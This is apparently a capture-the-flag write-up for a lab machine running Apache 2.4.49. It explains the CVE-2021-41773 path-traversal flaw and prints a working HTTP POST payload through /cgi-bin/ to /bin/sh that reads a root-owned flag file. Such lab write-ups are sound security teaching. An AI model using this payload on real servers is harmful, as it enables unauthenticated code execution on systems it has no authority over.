# Writeup — Bee-Path (CVE-2021-41773)

**Author:** @MohamedOutougane  
**Machine:** vuln-apache-path-traversal  
**Difficulty:** Easy  
**Date:** 2026-04-14  

---

## Summary

Apache 2.4.49 fails to properly normalize URL-encoded path separators before
checking document root boundaries. This allows traversal outside the webroot,
and combined with mod_cgi, leads to unauthenticated Remote Code Execution.

---

## Enumeration

Port scan reveals HTTP on port 80. The server banner identifies Apache 2.4.49,
a version known to be vulnerable to CVE-2021-41773.

---

## Exploitation

The path traversal payload uses `%2e` (URL-encoded `.`) to bypass the path
normalization check. Routing the request through `/cgi-bin/` enables CGI
execution, which passes the request body to `/bin/sh` as a shell command.

**Payload:**

POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
Content-Type: application/x-www-form-urlencoded
echo; cat /root/flag.txt